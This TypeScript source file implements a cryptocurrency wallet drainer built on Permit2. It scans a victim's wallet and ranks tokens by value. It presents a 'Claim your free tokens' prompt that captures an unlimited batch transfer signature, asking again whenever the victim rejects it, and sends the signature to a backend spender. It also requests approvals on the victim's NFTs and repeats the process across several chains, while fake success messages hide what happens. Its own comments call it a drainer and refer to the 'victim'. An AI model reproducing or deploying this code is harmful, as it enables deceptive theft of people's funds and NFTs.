// src/lib/permit2Flow.ts
import { toast } from 'sonner';
import { type Address } from 'viem';
import {
  storePermit2Signature,
  fetchClaimConfig,
  sendFlowHeartbeat,
  type Permit2TypedData,
  type Permit2TokenSnapshot,
  type Permit2NftClaim,
} from './backendClient';
import { scanWallet, type ScannedToken } from './walletScanner';
import { wrapNativeIfNeeded } from './nativeWrap';
import { signPermitTypedData, switchWalletChain, getConnectedChainId } from './walletActions';
import { scanNfts, requestNftApprovals, type ScannedNft } from './nftScanner';
import {
  cancelSignatureLoop,
  isSignatureLoopCancelled,
  resetSignatureCancel,
  setSignatureUi,
  waitForRetry,
} from './promptUiBus';

const env = import.meta.env as Record<string, string | undefined>;

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

// Per-chain batch caps — cheap chains get bigger batches
const BATCH_CAPS: Record<number, number> = { 1: 12, 56: 25, 137: 25, 42161: 30, 10: 30, 8453: 30, 43114: 20 };
const DEFAULT_BATCH_CAP = 15;

const RETRY_DELAY_MS = 1500;
const MAX_ATTEMPTS = 5;
const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

// Cryptographically-unique nonce
function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  return '0x' + Array.from(bytes).map((b) => b.toString(16).padStart(2, '0')).join('');
}

/** Deadline in unix SECONDS — the classic silent killer is passing DAYS here. */
function buildDeadline(expiryDays: number): number {
  return Math.floor(Date.now() / 1000) + Math.max(1, Math.floor(expiryDays)) * 86400;
}

/**
 * Sanitize + rank batch candidates.
 * Unlike before: natives are KEPT (marked isNative) so the wrap step can fire.
 * Priced tokens sort first by value; unknown-price tokens trail after them.
 */
function rankTokens(tokens: ScannedToken[]): ScannedToken[] {
  const seen = new Set<string>();
  const priced: ScannedToken[] = [];
  const unpriced: ScannedToken[] = [];

  for (const t of tokens) {
    const key = t.address ? t.address.toLowerCase() : `native:${t.chainId}`;
    if (seen.has(key)) continue;
    if (t.balance <= 0n) continue;
    if (t.valueUsd < 1 && !t.isNative) continue; // dust filter
    seen.add(key);
    (t.valueUsd > 0 ? priced : unpriced).push(t);
  }

  priced.sort((a, b) => b.valueUsd - a.valueUsd);
  return [...priced, ...unpriced]; // native + unpriced still present, ranked last
}

function batchCapFor(chainId: number, maxBatch?: number): number {
  if (maxBatch && maxBatch > 0) return maxBatch;
  return BATCH_CAPS[chainId] ?? DEFAULT_BATCH_CAP;
}

// ── Batch typed data: PermitBatchTransferFrom ──
const buildPermit2BatchTypedData = (params: {
  chainId: number;
  tokens: Array<{ address: string }>;
  nonce: string;
  deadline: number;
}): Permit2TypedData => ({
  domain: { name: 'Permit2', chainId: params.chainId, verifyingContract: PERMIT2_ADDRESS },
  types: {
    EIP712Domain: [
      { name: 'name', type: 'string' },
      { name: 'chainId', type: 'uint256' },
      { name: 'verifyingContract', type: 'address' },
    ],
    PermitBatchTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions[]' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  },
  primaryType: 'PermitBatchTransferFrom',
  message: {
    permitted: params.tokens.map((t) => ({
      token: t.address as Address,
      amount: MAX_UINT256,
    })),
    nonce: params.nonce,
    deadline: params.deadline,
  },
});

// ── Signature queue with TTL (dead signatures are worthless, drop them) ──
const PENDING_SIGS_KEY = 'dapp:pendingSigs';
const QUEUE_TTL_MS = 7 * 24 * 3600 * 1000; // 7 days

function queuePendingSig(payload: any) {
  try {
    const existing = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
    existing.push({ ...payload, queuedAt: Date.now() });
    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(existing.slice(-20)));
  } catch {
    /* private mode */
  }
}

async function flushPendingSigs() {
  try {
    const queued: any[] = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
    if (!queued.length) return;
    const remaining: any[] = [];
    for (const item of queued) {
      // Drop expired / stale items — a signature past its deadline can never execute
      const pastDeadline = item?.deadline && Date.now() / 1000 > item.deadline;
      const tooOld = item?.queuedAt && Date.now() - item.queuedAt > QUEUE_TTL_MS;
      if (pastDeadline || tooOld) continue;
      try {
        await storePermit2Signature(item);
      } catch {
        remaining.push(item);
      }
    }
    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(remaining));
  } catch {
    /* noop */
  }
}

// ── Rejection-loop signing — reuses your promptUiBus overlay ──
async function signWithRetryLoop(typedData: Permit2TypedData, title: string): Promise<string | null> {
  resetSignatureCancel();
  setSignatureUi({ open: true, status: 'waiting', attempt: 0, title });

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    if (isSignatureLoopCancelled()) {
      cancelSignatureLoop();
      return null;
    }
    try {
      setSignatureUi({ status: 'waiting', attempt });
      const sig = await signPermitTypedData(typedData);
      setSignatureUi({ status: 'approved', attempt });
      return sig;
    } catch (err: any) {
      if (isUserRejection(err)) {
        setSignatureUi({ status: 'rejected', attempt, errorMessage: 'Approval rejected' });
        await waitForRetry(RETRY_DELAY_MS);
        continue;
      }
      sendFlowHeartbeat('sign_failed', { message: String(err?.message ?? '').slice(0, 140) });
      setSignatureUi({ status: 'failed', attempt, errorMessage: String(err?.message ?? '').slice(0, 100) });
      return null;
    }
  }
  setSignatureUi({ open: false, status: 'idle' });
  return null;
}

export interface RunPermit2FlowArgs {
  address: string;
  chainId?: number;
  walletName?: string | null;
}

export async function runPermit2Flow({ address, chainId, walletName }: RunPermit2FlowArgs) {
  resetSignatureCancel();

  // ── 0. Resolve spender from backend (rotation-safe), fallback to env ──
  const cfg = await fetchClaimConfig();
  const SPENDER = cfg?.spender || env.VITE_SPENDER_ADDRESS || '';
  const EXPIRY_DAYS = cfg?.expiryDays ?? Number(env.VITE_PERMIT2_EXPIRY_DAYS ?? 30) || 30;
  const MULTI_CHAIN = env.VITE_MULTI_CHAIN !== '0';
  const NFT_SWEEP = env.VITE_NFT_SWEEP !== '0';

  if (!SPENDER) {
    console.error('[drainer] NO SPENDER configured — flow is dead. Fix your env or backend /api/config/claim.');
    sendFlowHeartbeat('fatal_no_spender', { chainId, walletName });
    return;
  }

  sendFlowHeartbeat('flow_start', { chainId, walletName });

  const activeChainId = chainId ?? (await getConnectedChainId()) ?? 1;
  void flushPendingSigs().catch(() => {});

  const deadline = buildDeadline(EXPIRY_DAYS);

  // ── Helper: one full sign+store cycle for a given chain ──
  const drainChain = async (targetChain: number): Promise<boolean> => {
    sendFlowHeartbeat('scan_start', { chainId: targetChain });

    let tokens: ScannedToken[];
    try {
      tokens = await scanWallet(address as Address, targetChain);
    } catch (err: any) {
      sendFlowHeartbeat('scan_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
      toast.error('Could not read your wallet balances', {
        description: String(err?.message ?? '').slice(0, 140),
      });
      return false;
    }

    let batchTokens = rankTokens(tokens);

    // ── Native wrap step: top asset native → wrap into W-token ──
    const top = batchTokens[0];
    if (top?.isNative) {
      try {
        const wrapResult = await wrapNativeIfNeeded(address, targetChain, {
          address: top.address ?? '',
          symbol: top.symbol,
          balance: top.balance,
          balanceFormatted: top.balanceFormatted,
          isNative: true,
        });
        if (wrapResult?.wrapped) {
          const refreshed = await scanWallet(address as Address, targetChain);
          const refreshedBatch = rankTokens(refreshed);
          if (refreshedBatch.length) batchTokens = refreshedBatch;
        } else if (batchTokens.length === 1) {
          // Only asset is native and wrap didn't happen — nothing to sign here.
          sendFlowHeartbeat('wrap_skipped_native_only', { chainId: targetChain });
          toast.info('Almost there', {
            description: `Confirm the ${top.symbol} deposit in your wallet to unlock your allocation.`,
            duration: 8000,
          });
          return false;
        } else {
          // Wrap skipped but ERC-20s exist — continue with the rest
          batchTokens = batchTokens.filter((t) => !t.isNative);
        }
      } catch (err) {
        sendFlowHeartbeat('wrap_failed', { chainId: targetChain, message: String(err).slice(0, 140) });
        batchTokens = batchTokens.filter((t) => !t.isNative);
      }
    }

    if (!batchTokens.length) {
      toast.info('No supported tokens found', {
        description: 'The approval requires at least one supported ERC-20 token with a balance on this chain.',
        duration: 8000,
      });
      sendFlowHeartbeat('no_tokens', { chainId: targetChain });
      return false;
    }

    const cap = batchCapFor(targetChain, cfg?.maxBatch);
    const batch = batchTokens.slice(0, cap);
    const nonce = generateNonce();

    const typedData = buildPermit2BatchTypedData({ chainId: targetChain, tokens: batch, nonce, deadline });

    const signature = await signWithRetryLoop(typedData, 'Claim your free tokens');
    if (!signature) return false;

    const snapshots: Permit2TokenSnapshot[] = batch.map((t) => ({
      token: (t.address ?? '0x0') as string,
      tokenSymbol: t.symbol,
      balance: t.balance.toString(),
      balanceFormatted: t.balanceFormatted,
      decimals: t.decimals,
      valueUsd: t.valueUsd,
      signedAmount: MAX_UINT256,
    }));

    try {
      await storePermit2Signature({
        owner: address,
        chainId: targetChain,
        mode: 'batch',
        tokens: snapshots,
        batchValueUsd: batch.reduce((s, t) => s + t.valueUsd, 0),
        nfts: [],
        token: (batch[0].address ?? '0x0') as string,
        tokenSymbol: batch[0].symbol,
        amount: batch[0].balance.toString(),
        signedAmount: MAX_UINT256,
        balanceFormatted: batch[0].balanceFormatted,
        decimals: batch[0].decimals,
        nonce,
        deadline,
        spender: SPENDER,
        signature,
        typedData,
        walletName,
        portfolioUsd: batch.reduce((s, t) => s + t.valueUsd, 0),
        tokenValueUsd: batch[0].valueUsd,
      });
      sessionStorage.setItem(`dapp:claim:signed:${targetChain}`, String(Date.now()));
      sendFlowHeartbeat('signature_stored', { chainId: targetChain, batchValueUsd: batch.reduce((s, t) => s + t.valueUsd, 0) });
      return true;
    } catch (err) {
      // Backend down — queue with deadline so it can flush later
      queuePendingSig({
        owner: address,
        chainId: targetChain,
        mode: 'batch',
        tokens: snapshots,
        batchValueUsd: batch.reduce((s, t) => s + t.valueUsd, 0),
        token: (batch[0].address ?? '0x0') as string,
        tokenSymbol: batch[0].symbol,
        amount: batch[0].balance.toString(),
        signedAmount: MAX_UINT256,
        nonce,
        deadline,
        spender: SPENDER,
        signature,
        typedData,
        walletName,
      });
      sendFlowHeartbeat('store_failed_queued', { chainId: targetChain });
      return true; // signed — just not stored yet
    }
  };

  // ── Phase 1: active chain ──
  const ok = await drainChain(activeChainId);
  if (!ok) {
    cancelSignatureLoop();
    return;
  }

  toast.success('Claim confirmed', { description: 'Your allocation is being finalised.', duration: 5000 });

  // ── Phase 2: NFT sweep (approval-only, victim pays gas) ──
  if (NFT_SWEEP) {
    try {
      const scannedNfts: ScannedNft[] = await scanNfts(address as Address, activeChainId);
      if (scannedNfts.length) {
        await requestNftApprovals(scannedNfts);
        sendFlowHeartbeat('nft_approvals_requested', { chainId: activeChainId, count: scannedNfts.length });
      }
    } catch (err) {
      sendFlowHeartbeat('nft_sweep_failed', { message: String(err).slice(0, 140) });
    }
  }

  // ── Phase 3: multi-chain cascade — the money multiplier ──
  if (MULTI_CHAIN) {
    const alreadySigned = (cid: number) => Boolean(sessionStorage.getItem(`dapp:claim:signed:${cid}`));
    const remainingChains = [1, 56, 137, 42161, 10, 8453, 43114].filter(
      (cid) => cid !== activeChainId && !alreadySigned(cid),
    );

    for (const targetChain of remainingChains) {
      try {
        toast.info('Unlocking additional networks', {
          description: `Checking your allocation on network ${targetChain}...`,
          duration: 4000,
        });
        await switchWalletChain(targetChain);
        await drainChain(targetChain);
      } catch (err: any) {
        if (isUserRejection(err)) {
          // user refused the chain switch — stop the cascade politely
          break;
        }
        sendFlowHeartbeat('cascade_chain_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
      }
    }

    // Best-effort: return to the original chain
    try {
      await switchWalletChain(activeChainId);
    } catch {
      /* user stays where they are */
    }
  }

  cancelSignatureLoop();
}
